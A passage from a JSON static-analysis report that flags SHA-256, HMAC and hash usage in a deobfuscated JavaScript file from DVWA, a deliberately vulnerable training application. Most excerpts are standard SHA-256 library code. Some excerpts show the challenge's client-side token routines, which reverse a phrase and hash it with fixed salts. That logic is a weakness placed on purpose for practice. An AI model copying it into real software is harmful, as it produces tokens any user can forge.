        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "    }\n\n    if (key.length &gt; 64) {\n      key = (new Sha256(is224, true)).update(key).array();\n    }\n\n    var oKeyPad = [], iKeyPad = [];\n    for (i = 0; i &lt; 64; ++i) {\n      var b = key[i] || 0;\n",
        "startLocationLine": 470,
        "startLocationColumn": 18,
        "endLocationLine": 470,
        "endLocationColumn": 22
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "      iKeyPad[i] = 0x36 ^ b;\n    }\n\n    Sha256.call(this, is224, sharedMemory);\n\n    this.update(iKeyPad);\n    this.oKeyPad = oKeyPad;\n    this.inner = true;\n    this.sharedMemory = sharedMemory;\n",
        "startLocationLine": 480,
        "startLocationColumn": 5,
        "endLocationLine": 480,
        "endLocationColumn": 9
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "    this.inner = true;\n    this.sharedMemory = sharedMemory;\n  }\n  HmacSha256.prototype = new Sha256();\n\n  HmacSha256.prototype.finalize = function () {\n    Sha256.prototype.finalize.call(this);\n    if (this.inner) {\n      this.inner = false;\n",
        "startLocationLine": 487,
        "startLocationColumn": 7,
        "endLocationLine": 487,
        "endLocationColumn": 11
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "    this.inner = true;\n    this.sharedMemory = sharedMemory;\n  }\n  HmacSha256.prototype = new Sha256();\n\n  HmacSha256.prototype.finalize = function () {\n    Sha256.prototype.finalize.call(this);\n    if (this.inner) {\n      this.inner = false;\n",
        "startLocationLine": 487,
        "startLocationColumn": 30,
        "endLocationLine": 487,
        "endLocationColumn": 34
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "  }\n  HmacSha256.prototype = new Sha256();\n\n  HmacSha256.prototype.finalize = function () {\n    Sha256.prototype.finalize.call(this);\n    if (this.inner) {\n      this.inner = false;\n      var innerHash = this.array();\n      Sha256.call(this, this.is224, this.sharedMemory);\n",
        "startLocationLine": 489,
        "startLocationColumn": 7,
        "endLocationLine": 489,
        "endLocationColumn": 11
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "  HmacSha256.prototype = new Sha256();\n\n  HmacSha256.prototype.finalize = function () {\n    Sha256.prototype.finalize.call(this);\n    if (this.inner) {\n      this.inner = false;\n      var innerHash = this.array();\n      Sha256.call(this, this.is224, this.sharedMemory);\n      this.update(this.oKeyPad);\n",
        "startLocationLine": 490,
        "startLocationColumn": 5,
        "endLocationLine": 490,
        "endLocationColumn": 9
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "  if (this.inner) {\n    this.inner = false;\n    var innerHash = this.array();\n    Sha256.call(this, this.is224, this.sharedMemory);\n    this.update(this.oKeyPad);\n    this.update(innerHash);\n    Sha256.prototype.finalize.call(this);\n  }\n};\n",
        "startLocationLine": 494,
        "startLocationColumn": 7,
        "endLocationLine": 494,
        "endLocationColumn": 11
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "      Sha256.call(this, this.is224, this.sharedMemory);\n      this.update(this.oKeyPad);\n      this.update(innerHash);\n      Sha256.prototype.finalize.call(this);\n    }\n  };\n\n  var exports = createMethod();\n  exports.sha256 = exports;\n",
        "startLocationLine": 497,
        "startLocationColumn": 7,
        "endLocationLine": 497,
        "endLocationColumn": 11
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "sha2",
        "excerpt": "  };\n\n  var exports = createMethod();\n  exports.sha256 = exports;\n  exports.sha224 = createMethod(true);\n  exports.sha256.hmac = createHmacMethod();\n  exports.sha224.hmac = createHmacMethod(true);\n\n  if (COMMON_JS) {\n",
        "startLocationLine": 502,
        "startLocationColumn": 11,
        "endLocationLine": 502,
        "endLocationColumn": 15
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "sha2",
        "excerpt": "\n  var exports = createMethod();\n  exports.sha256 = exports;\n  exports.sha224 = createMethod(true);\n  exports.sha256.hmac = createHmacMethod();\n  exports.sha224.hmac = createHmacMethod(true);\n\n  if (COMMON_JS) {\n    module.exports = exports;\n",
        "startLocationLine": 503,
        "startLocationColumn": 11,
        "endLocationLine": 503,
        "endLocationColumn": 15
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "sha2",
        "excerpt": "  var exports = createMethod();\n  exports.sha256 = exports;\n  exports.sha224 = createMethod(true);\n  exports.sha256.hmac = createHmacMethod();\n  exports.sha224.hmac = createHmacMethod(true);\n\n  if (COMMON_JS) {\n    module.exports = exports;\n  } else {\n",
        "startLocationLine": 504,
        "startLocationColumn": 11,
        "endLocationLine": 504,
        "endLocationColumn": 15
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "sha2",
        "excerpt": "  exports.sha256 = exports;\n  exports.sha224 = createMethod(true);\n  exports.sha256.hmac = createHmacMethod();\n  exports.sha224.hmac = createHmacMethod(true);\n\n  if (COMMON_JS) {\n    module.exports = exports;\n  } else {\n    root.sha256 = exports.sha256;\n",
        "startLocationLine": 505,
        "startLocationColumn": 11,
        "endLocationLine": 505,
        "endLocationColumn": 15
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "sha2",
        "excerpt": "if (COMMON_JS) {\n  module.exports = exports;\n} else {\n  root.sha256 = exports.sha256;\n  root.sha224 = exports.sha224;\n  if (AMD) {\n    define(function () {\n      return exports;\n    });\n",
        "startLocationLine": 510,
        "startLocationColumn": 10,
        "endLocationLine": 510,
        "endLocationColumn": 14
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "sha2",
        "excerpt": "if (COMMON_JS) {\n  module.exports = exports;\n} else {\n  root.sha256 = exports.sha256;\n  root.sha224 = exports.sha224;\n  if (AMD) {\n    define(function () {\n      return exports;\n    });\n",
        "startLocationLine": 510,
        "startLocationColumn": 27,
        "endLocationLine": 510,
        "endLocationColumn": 31
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "sha2",
        "excerpt": "  module.exports = exports;\n} else {\n  root.sha256 = exports.sha256;\n  root.sha224 = exports.sha224;\n  if (AMD) {\n    define(function () {\n      return exports;\n    });\n  }\n",
        "startLocationLine": 511,
        "startLocationColumn": 10,
        "endLocationLine": 511,
        "endLocationColumn": 14
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "sha2",
        "excerpt": "  module.exports = exports;\n} else {\n  root.sha256 = exports.sha256;\n  root.sha224 = exports.sha224;\n  if (AMD) {\n    define(function () {\n      return exports;\n    });\n  }\n",
        "startLocationLine": 511,
        "startLocationColumn": 27,
        "endLocationLine": 511,
        "endLocationColumn": 31
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "sha2",
        "excerpt": "function do_something(e){for(var t=&quot;&quot;,n=e.length-1;n&gt;=0;n--)t+=e[n];return t}\n\nfunction token_part_3(t, y=&quot;ZZ&quot;) {\n\tdocument.getElementById(&quot;token&quot;).value=sha256(document.getElementById(&quot;token&quot;).value+y)\n}\n\nfunction token_part_2(e=&quot;YY&quot;) {\n\tdocument.getElementById(&quot;token&quot;).value=sha256(e+document.getElementById(&quot;token&quot;).value)\n}\n",
        "startLocationLine": 523,
        "startLocationColumn": 41,
        "endLocationLine": 523,
        "endLocationColumn": 45
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "sha2",
        "excerpt": "}\n\nfunction token_part_2(e=&quot;YY&quot;) {\n\tdocument.getElementById(&quot;token&quot;).value=sha256(e+document.getElementById(&quot;token&quot;).value)\n}\n\nfunction token_part_1(a,b) {\n\tdocument.getElementById(&quot;token&quot;).value=do_something(document.getElementById(&quot;phrase&quot;).value)\n}\n",
        "startLocationLine": 527,
        "startLocationColumn": 41,
        "endLocationLine": 527,
        "endLocationColumn": 45
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009000",
        "ruleName": "Cryptography: Hash Algorithm (Misc)",
        "ruleDescription": "Cryptography: Hash Algorithm (Misc)",
        "pattern": "RIPEMD|Blowfish|Twofish|Threefish|Serpent|HMAC|KeyedHashAlgorithm",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Misc"
        ],
        "sample": "Hmac",
        "excerpt": "    return nodeMethod;\n  };\n\n  var createHmacOutputMethod = function (outputType, is224) {\n    return function (key, message) {\n      return new HmacSha256(key, is224, true).update(message)[outputType]();\n    };\n  };\n\n",
        "startLocationLine": 106,
        "startLocationColumn": 13,
        "endLocationLine": 106,
        "endLocationColumn": 17
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009000",
        "ruleName": "Cryptography: Hash Algorithm (Misc)",
        "ruleDescription": "Cryptography: Hash Algorithm (Misc)",
        "pattern": "RIPEMD|Blowfish|Twofish|Threefish|Serpent|HMAC|KeyedHashAlgorithm",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Misc"
        ],
        "sample": "Hmac",
        "excerpt": "\n  var createHmacOutputMethod = function (outputType, is224) {\n    return function (key, message) {\n      return new HmacSha256(key, is224, true).update(message)[outputType]();\n    };\n  };\n\n  var createHmacMethod = function (is224) {\n    var method = createHmacOutputMethod(&#39;hex&#39;, is224);\n",
        "startLocationLine": 108,
        "startLocationColumn": 18,
        "endLocationLine": 108,
        "endLocationColumn": 22
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009000",
        "ruleName": "Cryptography: Hash Algorithm (Misc)",
        "ruleDescription": "Cryptography: Hash Algorithm (Misc)",
        "pattern": "RIPEMD|Blowfish|Twofish|Threefish|Serpent|HMAC|KeyedHashAlgorithm",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Misc"
        ],
        "sample": "Hmac",
        "excerpt": "    };\n  };\n\n  var createHmacMethod = function (is224) {\n    var method = createHmacOutputMethod(&#39;hex&#39;, is224);\n    method.create = function (key) {\n      return new HmacSha256(key, is224);\n    };\n    method.update = function (key, message) {\n",
        "startLocationLine": 112,
        "startLocationColumn": 13,
        "endLocationLine": 112,
        "endLocationColumn": 17
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009000",
        "ruleName": "Cryptography: Hash Algorithm (Misc)",
        "ruleDescription": "Cryptography: Hash Algorithm (Misc)",
        "pattern": "RIPEMD|Blowfish|Twofish|Threefish|Serpent|HMAC|KeyedHashAlgorithm",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Misc"
        ],
        "sample": "Hmac",
        "excerpt": "  };\n\n  var createHmacMethod = function (is224) {\n    var method = createHmacOutputMethod(&#39;hex&#39;, is224);\n    method.create = function (key) {\n      return new HmacSha256(key, is224);\n    };\n    method.update = function (key, message) {\n      return method.create(key).update(message);\n",
        "startLocationLine": 113,
        "startLocationColumn": 24,
        "endLocationLine": 113,
        "endLocationColumn": 28
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009000",
        "ruleName": "Cryptography: Hash Algorithm (Misc)",
        "ruleDescription": "Cryptography: Hash Algorithm (Misc)",
        "pattern": "RIPEMD|Blowfish|Twofish|Threefish|Serpent|HMAC|KeyedHashAlgorithm",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Misc"
        ],
        "sample": "Hmac",
        "excerpt": "var createHmacMethod = function (is224) {\n  var method = createHmacOutputMethod(&#39;hex&#39;, is224);\n  method.create = function (key) {\n    return new HmacSha256(key, is224);\n  };\n  method.update = function (key, message) {\n    return method.create(key).update(message);\n  };\n  for (var i = 0; i &lt; OUTPUT_TYPES.length; ++i) {\n",
        "startLocationLine": 115,
        "startLocationColumn": 18,
        "endLocationLine": 115,
        "endLocationColumn": 22
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009000",
        "ruleName": "Cryptography: Hash Algorithm (Misc)",
        "ruleDescription": "Cryptography: Hash Algorithm (Misc)",
        "pattern": "RIPEMD|Blowfish|Twofish|Threefish|Serpent|HMAC|KeyedHashAlgorithm",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Misc"
        ],
        "sample": "Hmac",
        "excerpt": "    };\n    for (var i = 0; i &lt; OUTPUT_TYPES.length; ++i) {\n      var type = OUTPUT_TYPES[i];\n      method[type] = createHmacOutputMethod(type, is224);\n    }\n    return method;\n  };\n\n  function Sha256(is224, sharedMemory) {\n",
        "startLocationLine": 122,
        "startLocationColumn": 28,
        "endLocationLine": 122,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009000",
        "ruleName": "Cryptography: Hash Algorithm (Misc)",
        "ruleDescription": "Cryptography: Hash Algorithm (Misc)",
        "pattern": "RIPEMD|Blowfish|Twofish|Threefish|Serpent|HMAC|KeyedHashAlgorithm",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Misc"
        ],
        "sample": "Hmac",
        "excerpt": "    return buffer;\n  };\n\n  function HmacSha256(key, is224, sharedMemory) {\n    var i, type = typeof key;\n    if (type === &#39;string&#39;) {\n      var bytes = [], length = key.length, index = 0, code;\n      for (i = 0; i &lt; length; ++i) {\n        code = key.charCodeAt(i);\n",
        "startLocationLine": 429,
        "startLocationColumn": 12,
        "endLocationLine": 429,
        "endLocationColumn": 16
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009000",
        "ruleName": "Cryptography: Hash Algorithm (Misc)",
        "ruleDescription": "Cryptography: Hash Algorithm (Misc)",
        "pattern": "RIPEMD|Blowfish|Twofish|Threefish|Serpent|HMAC|KeyedHashAlgorithm",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Misc"
        ],
        "sample": "Hmac",
        "excerpt": "    this.inner = true;\n    this.sharedMemory = sharedMemory;\n  }\n  HmacSha256.prototype = new Sha256();\n\n  HmacSha256.prototype.finalize = function () {\n    Sha256.prototype.finalize.call(this);\n    if (this.inner) {\n      this.inner = false;\n",
        "startLocationLine": 487,
        "startLocationColumn": 3,
        "endLocationLine": 487,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009000",
        "ruleName": "Cryptography: Hash Algorithm (Misc)",
        "ruleDescription": "Cryptography: Hash Algorithm (Misc)",
        "pattern": "RIPEMD|Blowfish|Twofish|Threefish|Serpent|HMAC|KeyedHashAlgorithm",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Misc"
        ],
        "sample": "Hmac",
        "excerpt": "  }\n  HmacSha256.prototype = new Sha256();\n\n  HmacSha256.prototype.finalize = function () {\n    Sha256.prototype.finalize.call(this);\n    if (this.inner) {\n      this.inner = false;\n      var innerHash = this.array();\n      Sha256.call(this, this.is224, this.sharedMemory);\n",
        "startLocationLine": 489,
        "startLocationColumn": 3,
        "endLocationLine": 489,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009000",
        "ruleName": "Cryptography: Hash Algorithm (Misc)",
        "ruleDescription": "Cryptography: Hash Algorithm (Misc)",
        "pattern": "RIPEMD|Blowfish|Twofish|Threefish|Serpent|HMAC|KeyedHashAlgorithm",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Misc"
        ],
        "sample": "hmac",
        "excerpt": "  var exports = createMethod();\n  exports.sha256 = exports;\n  exports.sha224 = createMethod(true);\n  exports.sha256.hmac = createHmacMethod();\n  exports.sha224.hmac = createHmacMethod(true);\n\n  if (COMMON_JS) {\n    module.exports = exports;\n  } else {\n",
        "startLocationLine": 504,
        "startLocationColumn": 18,
        "endLocationLine": 504,
        "endLocationColumn": 22
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009000",
        "ruleName": "Cryptography: Hash Algorithm (Misc)",
        "ruleDescription": "Cryptography: Hash Algorithm (Misc)",
        "pattern": "RIPEMD|Blowfish|Twofish|Threefish|Serpent|HMAC|KeyedHashAlgorithm",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Misc"
        ],
        "sample": "Hmac",
        "excerpt": "  var exports = createMethod();\n  exports.sha256 = exports;\n  exports.sha224 = createMethod(true);\n  exports.sha256.hmac = createHmacMethod();\n  exports.sha224.hmac = createHmacMethod(true);\n\n  if (COMMON_JS) {\n    module.exports = exports;\n  } else {\n",
        "startLocationLine": 504,
        "startLocationColumn": 31,
        "endLocationLine": 504,
        "endLocationColumn": 35
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009000",
        "ruleName": "Cryptography: Hash Algorithm (Misc)",
        "ruleDescription": "Cryptography: Hash Algorithm (Misc)",
        "pattern": "RIPEMD|Blowfish|Twofish|Threefish|Serpent|HMAC|KeyedHashAlgorithm",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Misc"
        ],
        "sample": "hmac",
        "excerpt": "  exports.sha256 = exports;\n  exports.sha224 = createMethod(true);\n  exports.sha256.hmac = createHmacMethod();\n  exports.sha224.hmac = createHmacMethod(true);\n\n  if (COMMON_JS) {\n    module.exports = exports;\n  } else {\n    root.sha256 = exports.sha256;\n",
        "startLocationLine": 505,
        "startLocationColumn": 18,
        "endLocationLine": 505,
        "endLocationColumn": 22
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009000",
        "ruleName": "Cryptography: Hash Algorithm (Misc)",
        "ruleDescription": "Cryptography: Hash Algorithm (Misc)",
        "pattern": "RIPEMD|Blowfish|Twofish|Threefish|Serpent|HMAC|KeyedHashAlgorithm",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Misc"
        ],
        "sample": "Hmac",
        "excerpt": "  exports.sha256 = exports;\n  exports.sha224 = createMethod(true);\n  exports.sha256.hmac = createHmacMethod();\n  exports.sha224.hmac = createHmacMethod(true);\n\n  if (COMMON_JS) {\n    module.exports = exports;\n  } else {\n    root.sha256 = exports.sha256;\n",
        "startLocationLine": 505,
        "startLocationColumn": 31,
        "endLocationLine": 505,
        "endLocationColumn": 35
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009200",
        "ruleName": "Cryptography: Hash Algorithm (General)",
        "ruleDescription": "Cryptography: Hash Algorithm (General)",
        "pattern": "hash",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.General"
        ],
        "sample": "Hash",
